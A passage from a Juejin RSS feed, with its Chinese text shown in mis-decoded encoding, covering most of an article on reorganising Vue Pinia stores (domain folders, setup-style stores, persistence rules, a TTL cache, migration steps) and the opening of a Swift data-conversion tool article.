â”‚   â”œâ”€â”€ system.ts
â”‚   â””â”€â”€ loading.ts
â”œâ”€â”€ basicData/            <span class="hljs-comment"># åŸºç¡€æ•°æ®åŸŸï¼šç¼“å­˜ã€å­—å…¸</span>
â”‚   â”œâ”€â”€ index.ts
â”‚   â”œâ”€â”€ cache.ts
â”‚   â””â”€â”€ dict.ts
â”œâ”€â”€ search/               <span class="hljs-comment"># æœç´¢åŸŸï¼šæŸ¥è¯¢è¡¨å•ã€æ”¶è—</span>
â”‚   â”œâ”€â”€ index.ts
â”‚   â”œâ”€â”€ queryForm.ts
â”‚   â””â”€â”€ favorite.ts
â”œâ”€â”€ order/                <span class="hljs-comment"># è®¢å•åŸŸï¼šè¡¨å•ã€è‰ç¨¿</span>
â”‚   â”œâ”€â”€ index.ts
â”‚   â”œâ”€â”€ orderForm.ts
â”‚   â””â”€â”€ orderDraft.ts
â””â”€â”€ types/                <span class="hljs-comment"># ç±»å‹å®šä¹‰</span>
    â”œâ”€â”€ index.ts
    â””â”€â”€ user.types.ts
</code></pre>
<p>æ¯ä¸ªåŸŸä¸€ä¸ªç›®å½•ï¼Œæ¯ä¸ªç›®å½•ä¸€ä¸ª <code>index.ts</code> è´Ÿè´£å¯¼å‡ºã€‚ä½¿ç”¨æ—¶å¯ä»¥æŒ‰åŸŸå¯¼å…¥ï¼Œä¹Ÿå¯ä»¥ä»æ ¹ç›®å½•å¯¼å…¥ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æŒ‰åŸŸå¯¼å…¥ï¼ˆæ¨èï¼‰</span>
<span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'~/store/core'</span>

<span class="hljs-comment">// æ ¹ç›®å½•å¯¼å…¥</span>
<span class="hljs-keyword">import</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'~/store'</span>
</code></pre>
<h3 data-id="heading-7">äºŒã€ç»Ÿä¸€ Setup é£æ ¼ + ä»£ç åˆ†å—</h3>
<p>æ‰€æœ‰ Store ç»Ÿä¸€ç”¨ Setup é£æ ¼é‡å†™ï¼Œä»£ç æŒ‰ State â†’ Getters â†’ Actions â†’ Return åˆ†å—ç»„ç»‡ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">/**
 * ç”¨æˆ·çŠ¶æ€ç®¡ç†
 * <span class="hljs-doctag">@description</span> ç®¡ç†ç”¨æˆ·ä¿¡æ¯ã€æƒé™ã€Token
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useUserStore = <span class="hljs-title function_">defineStore</span>(
  <span class="hljs-string">'user'</span>,
  <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// ==================== State ====================</span>

    <span class="hljs-comment">/** ç”¨æˆ·ä¿¡æ¯ */</span>
    <span class="hljs-keyword">const</span> userInfo = ref&lt;<span class="hljs-title class_">UserInfo</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>)

    <span class="hljs-comment">/** æƒé™åˆ—è¡¨ */</span>
    <span class="hljs-keyword">const</span> permissions = ref&lt;<span class="hljs-built_in">string</span>[]&gt;([])

    <span class="hljs-comment">/** Token */</span>
    <span class="hljs-keyword">const</span> token = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)

    <span class="hljs-comment">// ==================== Getters ====================</span>

    <span class="hljs-comment">/** æ˜¯å¦å·²ç™»å½• */</span>
    <span class="hljs-keyword">const</span> isLoggedIn = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> !!token.<span class="hljs-property">value</span> &amp;&amp; !!userInfo.<span class="hljs-property">value</span>)

    <span class="hljs-comment">/** æ£€æŸ¥æ˜¯å¦æœ‰æŒ‡å®šæƒé™ */</span>
    <span class="hljs-keyword">const</span> hasPermission = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-function">(<span class="hljs-params">code: <span class="hljs-built_in">string</span></span>) =&gt;</span>
      permissions.<span class="hljs-property">value</span>.<span class="hljs-title function_">includes</span>(code)
    )

    <span class="hljs-comment">// ==================== Actions ====================</span>

    <span class="hljs-comment">/**
     * åŠ è½½ç”¨æˆ·ä¿¡æ¯
     */</span>
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadUserInfo</span>(<span class="hljs-params"/>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
      <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getUserInfo</span>()
      userInfo.<span class="hljs-property">value</span> = res.<span class="hljs-property">data</span>
    }

    <span class="hljs-comment">/**
     * ç™»å‡º
     */</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">logout</span>(<span class="hljs-params"/>): <span class="hljs-built_in">void</span> {
      userInfo.<span class="hljs-property">value</span> = <span class="hljs-literal">null</span>
      permissions.<span class="hljs-property">value</span> = []
      token.<span class="hljs-property">value</span> = <span class="hljs-string">''</span>
    }

    <span class="hljs-comment">// ==================== Return ====================</span>

    <span class="hljs-keyword">return</span> {
      <span class="hljs-comment">// State</span>
      userInfo,
      permissions,
      token,
      <span class="hljs-comment">// Getters</span>
      isLoggedIn,
      hasPermission,
      <span class="hljs-comment">// Actions</span>
      loadUserInfo,
      logout,
    }
  },
  {
    <span class="hljs-attr">persist</span>: {
      <span class="hljs-attr">key</span>: <span class="hljs-string">'app-user'</span>,
      <span class="hljs-attr">storage</span>: <span class="hljs-variable language_">localStorage</span>,
    },
  },
)
</code></pre>
<p>è¿™ä¸ªç»“æ„æœ‰å‡ ä¸ªå¥½å¤„ï¼š</p>
<ol>
<li><strong>æ³¨é‡Šåˆ†å—</strong>ï¼Œä¸€ç›®äº†ç„¶</li>
<li><strong>è¿”å›å€¼æ˜¾å¼åˆ—å‡º</strong>ï¼ŒçŸ¥é“ Store æš´éœ²äº†ä»€ä¹ˆ</li>
<li><strong>ç±»å‹æ¨æ–­å®Œç¾</strong>ï¼Œä¸éœ€è¦é¢å¤–å£°æ˜</li>
</ol>
<h3 data-id="heading-8">ä¸‰ã€ç»Ÿä¸€æŒä¹…åŒ–ç­–ç•¥</h3>
<p>ä¹‹å‰çš„æŒä¹…åŒ–å¾ˆéšæ„ï¼Œç°åœ¨ç»Ÿä¸€è§„åˆ™ï¼š</p>



































<table><thead><tr><th>æ•°æ®ç±»å‹</th><th>å­˜å‚¨æ–¹å¼</th><th>ç†ç”±</th></tr></thead><tbody><tr><td>ç”¨æˆ·ä¿¡æ¯ã€Token</td><td>localStorage</td><td>éœ€è¦è·¨æ ‡ç­¾é¡µã€æŒä¹…ä¿å­˜</td></tr><tr><td>ç³»ç»Ÿé…ç½®ã€ä¸»é¢˜</td><td>localStorage</td><td>ç”¨æˆ·åå¥½éœ€è¦æŒä¹…</td></tr><tr><td>è¡¨å•è‰ç¨¿</td><td>localStorage</td><td>é˜²æ­¢æ„å¤–å…³é—­ä¸¢å¤±</td></tr><tr><td>æŸ¥è¯¢æ¡ä»¶</td><td>sessionStorage</td><td>åªåœ¨å½“å‰ä¼šè¯æœ‰æ•ˆ</td></tr><tr><td>åŠ è½½çŠ¶æ€</td><td>ä¸æŒä¹…åŒ–</td><td>å®æ—¶çŠ¶æ€ï¼Œåˆ·æ–°å½’é›¶</td></tr></tbody></table>
<h3 data-id="heading-9">å››ã€å¸¦ TTL çš„ç¼“å­˜ Store</h3>
<p>åŸºç¡€æ•°æ®ï¼ˆæ¯”å¦‚å­—å…¸ã€çœå¸‚åŒºï¼‰éœ€è¦ç¼“å­˜ï¼Œä½†ä¸èƒ½æ— é™æœŸã€‚å†™äº†ä¸€ä¸ªé€šç”¨çš„å¸¦è¿‡æœŸæ—¶é—´çš„ç¼“å­˜ Storeï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useDictStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'dict'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">/** ç¼“å­˜æ•°æ® */</span>
  <span class="hljs-keyword">const</span> cache = ref&lt;<span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">CacheItem</span>&gt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>())

  <span class="hljs-comment">/** é»˜è®¤ TTLï¼š30 åˆ†é’Ÿ */</span>
  <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_TTL</span> = <span class="hljs-number">30</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>

  <span class="hljs-comment">/**
   * è·å–å­—å…¸æ•°æ®ï¼ˆè‡ªåŠ¨å¤„ç†ç¼“å­˜ï¼‰
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getDict</span>(<span class="hljs-params"><span class="hljs-keyword">type</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">DictItem</span>[]&gt; {
    <span class="hljs-keyword">const</span> cached = cache.<span class="hljs-property">value</span>.<span class="hljs-title function_">get</span>(<span class="hljs-keyword">type</span>)

    <span class="hljs-comment">// ç¼“å­˜æœ‰æ•ˆï¼Œç›´æ¥è¿”å›</span>
    <span class="hljs-keyword">if</span> (cached &amp;&amp; <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - cached.<span class="hljs-property">timestamp</span> &lt; cached.<span class="hljs-property">ttl</span>) {
      <span class="hljs-keyword">return</span> cached.<span class="hljs-property">data</span>
    }

    <span class="hljs-comment">// ç¼“å­˜è¿‡æœŸæˆ–ä¸å­˜åœ¨ï¼Œé‡æ–°è¯·æ±‚</span>
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchDictByType</span>(<span class="hljs-keyword">type</span>)
    cache.<span class="hljs-property">value</span>.<span class="hljs-title function_">set</span>(<span class="hljs-keyword">type</span>, {
      <span class="hljs-attr">data</span>: res.<span class="hljs-property">data</span>,
      <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
      <span class="hljs-attr">ttl</span>: <span class="hljs-variable constant_">DEFAULT_TTL</span>,
    })

    <span class="hljs-keyword">return</span> res.<span class="hljs-property">data</span>
  }

  <span class="hljs-comment">/**
   * æ¸…é™¤æŒ‡å®šç¼“å­˜
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">clearCache</span>(<span class="hljs-params"><span class="hljs-keyword">type</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">void</span> {
    cache.<span class="hljs-property">value</span>.<span class="hljs-title function_">delete</span>(<span class="hljs-keyword">type</span>)
  }

  <span class="hljs-keyword">return</span> { cache, getDict, clearCache }
})
</code></pre>
<p>è°ƒç”¨æ–¹å®Œå…¨ä¸ç”¨å…³å¿ƒç¼“å­˜é€»è¾‘ï¼Œç›´æ¥ <code>await dictStore.getDict('CONTRACT_TYPE')</code> å°±è¡Œã€‚</p>
<h3 data-id="heading-10">äº”ã€Store å’Œ Composable çš„åˆ†å·¥</h3>
<p>è¿™æ˜¯å¾ˆå¤šäººçº ç»“çš„é—®é¢˜ï¼šä»€ä¹ˆæ—¶å€™ç”¨ Storeï¼Œä»€ä¹ˆæ—¶å€™ç”¨ Composableï¼Ÿ</p>
<p>æˆ‘çš„åŸåˆ™å¾ˆç®€å•ï¼š</p>








































<table><thead><tr><th>åœºæ™¯</th><th>ç”¨ Store</th><th>ç”¨ Composable</th></tr></thead><tbody><tr><td>æ•°æ®éœ€è¦è·¨ç»„ä»¶å…±äº«</td><td>âœ…</td><td>âŒ</td></tr><tr><td>æ•°æ®éœ€è¦æŒä¹…åŒ–</td><td>âœ…</td><td>âŒ</td></tr><tr><td>æ•°æ®æ˜¯å…¨å±€å•ä¾‹</td><td>âœ…</td><td>âŒ</td></tr><tr><td>åªåœ¨å•ä¸ªç»„ä»¶å†…ä½¿ç”¨</td><td>âŒ</td><td>âœ…</td></tr><tr><td>å°è£…å¯å¤ç”¨çš„é€»è¾‘</td><td>âŒ</td><td>âœ…</td></tr><tr><td>å°è£…å‰¯ä½œç”¨ï¼ˆå®šæ—¶å™¨ã€äº‹ä»¶ç›‘å¬ï¼‰</td><td>âŒ</td><td>âœ…</td></tr></tbody></table>
<p>ä¸¾ä¸ªä¾‹å­ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// Storeï¼šç®¡ç†å…¨å±€è®¢å•çŠ¶æ€</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useOrderStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'order'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> currentOrder = ref&lt;<span class="hljs-title class_">Order</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>)
  <span class="hljs-keyword">const</span> draftList = ref&lt;<span class="hljs-title class_">OrderDraft</span>[]&gt;([])
  <span class="hljs-keyword">return</span> { currentOrder, draftList }
})

<span class="hljs-comment">// Composableï¼šå°è£…è®¢å•è¡¨å•é€»è¾‘</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useOrderForm</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> store = <span class="hljs-title function_">useOrderStore</span>()
  <span class="hljs-keyword">const</span> { t } = <span class="hljs-title function_">useI18n</span>()

  <span class="hljs-comment">// è¡¨å•æ•°æ®ï¼ˆç»„ä»¶çº§ï¼Œä¸éœ€è¦å…±äº«ï¼‰</span>
  <span class="hljs-keyword">const</span> formData = ref&lt;<span class="hljs-title class_">OrderFormData</span>&gt;({})
  <span class="hljs-keyword">const</span> loading = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)

  <span class="hljs-comment">// è¡¨å•éªŒè¯è§„åˆ™</span>
  <span class="hljs-keyword">const</span> rules = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> ({
    <span class="hljs-attr">productName</span>: [{ <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">message</span>: <span class="hljs-title function_">t</span>(<span class="hljs-string">'order.productRequired'</span>) }],
  }))

  <span class="hljs-comment">// æäº¤è®¢å•</span>
  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">submit</span>(<span class="hljs-params"/>) {
    loading.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">submitOrder</span>(formData.<span class="hljs-property">value</span>)
      store.<span class="hljs-property">currentOrder</span> = result  <span class="hljs-comment">// æ›´æ–°å…¨å±€çŠ¶æ€</span>
      <span class="hljs-keyword">return</span> result
    } <span class="hljs-keyword">finally</span> {
      loading.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
    }
  }

  <span class="hljs-keyword">return</span> { formData, loading, rules, submit }
}
</code></pre>
<p>Store è´Ÿè´£"æ•°æ®ä»“åº“"ï¼ŒComposable è´Ÿè´£"ä¸šåŠ¡é€»è¾‘"ï¼Œå„å¸å…¶èŒã€‚</p>
<h2 data-id="heading-11">è¿ç§»è¿‡ç¨‹ï¼šæ€ä¹ˆå¹³æ»‘è¿‡æ¸¡</h2>
<p>ä¸å¯èƒ½ä¸€å£æ°”æŠŠæ‰€æœ‰ Store éƒ½é‡å†™ï¼Œé¡¹ç›®è¿˜è¦æ­£å¸¸è¿­ä»£ã€‚æˆ‘é‡‡ç”¨çš„ç­–ç•¥æ˜¯ï¼š</p>
<h3 data-id="heading-12">1. å‘åå…¼å®¹å¯¼å‡º</h3>
<p>æ—§çš„ Store æš‚æ—¶ä¿ç•™ï¼Œæ–°çš„ Store å†™åœ¨åŸŸç›®å½•é‡Œï¼Œç»Ÿä¸€åœ¨ <code>index.ts</code> åšå…¼å®¹å¯¼å‡ºï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/store/index.ts</span>

<span class="hljs-comment">// æ–°çš„åŸŸå¯¼å‡ºï¼ˆæ¨èä½¿ç”¨ï¼‰</span>
<span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'./core'</span>
<span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'./basicData'</span>
<span class="hljs-keyword">export</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">'./search'</span>

<span class="hljs-comment">// å‘åå…¼å®¹ï¼ˆé€æ­¥åºŸå¼ƒï¼‰</span>
<span class="hljs-keyword">export</span> { useUserStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'./core/user'</span>  <span class="hljs-comment">// æ—§è·¯å¾„çš„ä½¿ç”¨è€…ä¸ä¼šæŠ¥é”™</span>
</code></pre>
<h3 data-id="heading-13">2. é€æ­¥è¿ç§»</h3>
<p>æŒ‰ä¼˜å…ˆçº§åˆ†æ‰¹è¿ç§»ï¼š</p>
<ol>
<li><strong>Week 1-2</strong>ï¼šæ ¸å¿ƒåŸŸï¼ˆuserã€systemã€loadingï¼‰</li>
<li><strong>Week 3-4</strong>ï¼šåŸºç¡€æ•°æ®åŸŸï¼ˆç¼“å­˜ã€å­—å…¸ï¼‰</li>
<li><strong>Week 5-8</strong>ï¼šä¸šåŠ¡åŸŸï¼ˆæŒ‰æ¨¡å—é€ä¸ªè¿ç§»ï¼‰</li>
</ol>
<p>æ¯æ¬¡è¿ç§»å®Œä¸€ä¸ªæ¨¡å—ï¼Œè·‘ä¸€é TypeScript æ£€æŸ¥å’Œ E2E æµ‹è¯•ï¼Œç¡®ä¿æ²¡é—®é¢˜å†ç»§ç»­ã€‚</p>
<h3 data-id="heading-14">3. ESLint è§„åˆ™æŠ¤èˆª</h3>
<p>åŠ äº†å‡ æ¡ ESLint è§„åˆ™ï¼Œé˜²æ­¢"æ–°ä»£ç å†™æˆè€æ ·å­"ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// eslint.config.js</span>
{
  <span class="hljs-attr">files</span>: [<span class="hljs-string">'src/store/**/*.ts'</span>],
  <span class="hljs-attr">rules</span>: {
    <span class="hljs-comment">// ç¦æ­¢åœ¨ Store ä¸­ä½¿ç”¨ any</span>
    <span class="hljs-string">'@typescript-eslint/no-explicit-any'</span>: <span class="hljs-string">'error'</span>,
    <span class="hljs-comment">// å¼ºåˆ¶å¯¼å…¥æ’åº</span>
    <span class="hljs-string">'perfectionist/sort-imports'</span>: <span class="hljs-string">'error'</span>,
  },
}
</code></pre>
<h2 data-id="heading-15">æœ€ç»ˆæ•ˆæœ</h2>
<p>ä¸¤å‘¨åçš„ Store ç›®å½•ï¼š</p>
<ul>
<li>âœ… 6 ä¸ªä¸šåŠ¡åŸŸï¼Œç»“æ„æ¸…æ™°</li>
<li>âœ… 100% Setup é£æ ¼</li>
<li>âœ… 100% TypeScript ç±»å‹è¦†ç›–</li>
<li>âœ… ç»Ÿä¸€çš„æŒä¹…åŒ–ç­–ç•¥</li>
<li>âœ… å®Œå–„çš„ JSDoc æ³¨é‡Š</li>
</ul>
<p>ç»´æŠ¤æˆæœ¬ä»"çœ‹ä¸€çœ¼å°±å¤´ç–¼"å˜æˆäº†"é¡ºæ‰‹å°±èƒ½æ”¹"ã€‚</p>
<h2 data-id="heading-16">ä¸€äº›å¿ƒå¾—</h2>
<ol>
<li><strong>ä¸è¦ä¸€æ­¥åˆ°ä½</strong>ï¼šé‡æ„æœ€æ€•çš„æ˜¯"å¤§è·ƒè¿›"ï¼Œåˆ†æ‰¹è¿ç§»ã€é€æ­¥éªŒè¯æ‰æ˜¯æ­£é“</li>
<li><strong>å‘åå…¼å®¹å¾ˆé‡è¦</strong>ï¼šè€ä»£ç ä¸å¯èƒ½ä¸€å¤œä¹‹é—´éƒ½æ”¹å®Œï¼Œå…¼å®¹å±‚æ˜¯å¿…é¡»çš„</li>
<li><strong>è§„èŒƒå…ˆè¡Œ</strong>ï¼šå…ˆå®šå¥½è§„èŒƒï¼Œå†åŠ¨æ‰‹å†™ä»£ç ï¼Œä¸ç„¶è¿ç§»å®Œäº†åˆæ˜¯ä¸€å¨æ–°çš„å±å±±</li>
<li><strong>Store å’Œ Composable åˆ«æ··ç”¨</strong>ï¼šæƒ³æ¸…æ¥šæ¯ä¸ªä¸œè¥¿çš„èŒè´£ï¼Œåˆ«å›¾æ–¹ä¾¿ä»€ä¹ˆéƒ½å¾€ Store é‡Œå¡</li>
<li><strong>ç±»å‹æ˜¯æ–‡æ¡£</strong>ï¼šå¥½çš„ç±»å‹å®šä¹‰æ¯”æ³¨é‡Šæ›´æœ‰ç”¨ï¼Œ<code>interface</code> å†™æ¸…æ¥šäº†ï¼Œä»£ç è‡ªè§£é‡Š</li>
</ol>
<hr/>
<p>ä»¥ä¸Šå°±æ˜¯è¿™æ¬¡ Pinia æ²»ç†çš„å…¨è¿‡ç¨‹ã€‚å¦‚æœä½ ä¹Ÿåœ¨ç»´æŠ¤ä¸€ä¸ª"å†å²æ‚ ä¹…"çš„ Vue é¡¹ç›®ï¼Œå¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½ç»™ä½ ä¸€äº›å‚è€ƒã€‚</p>
<p>æœ‰é—®é¢˜æ¬¢è¿è¯„è®ºåŒºäº¤æµ ğŸ‘‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[iOS Swift å·¥å…·ç±»ï¼šæ•°æ®è½¬æ¢å·¥å…· ParseDataTool]]></title>    <link>https://juejin.cn/post/7581004702945099803</link>    <guid>https://juejin.cn/post/7581004702945099803</guid>    <pubDate>2025-12-08T03:44:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581004702945099803" data-draft-id="7580753790771445802" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="iOS Swift å·¥å…·ç±»ï¼šæ•°æ®è½¬æ¢å·¥å…· ParseDataTool"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-08T03:44:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="tangbin583085"/> <meta itemprop="url" content="https://juejin.cn/user/95026578465675"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            iOS Swift å·¥å…·ç±»ï¼šæ•°æ®è½¬æ¢å·¥å…· ParseDataTool
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/95026578465675/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    tangbin583085
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:44:16.000Z" title="Mon Dec 08 2025 03:44:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">iOS Swift å·¥å…·ç±»ï¼šæ•°æ®è½¬æ¢å·¥å…· ParseDataTool è§£æ</h2>
<p>åœ¨åšæ™ºèƒ½ç¡¬ä»¶è“ç‰™ã€Socketã€åè®®è§£æã€ç‰©è”ç½‘è®¾å¤‡é€šè®¯æ—¶ï¼Œæˆ‘ä»¬ç»å¸¸è¦å¤„ç†ï¼š</p>
<ul>
<li>åå…­è¿›åˆ¶å­—ç¬¦ä¸²äº’è½¬Data</li>
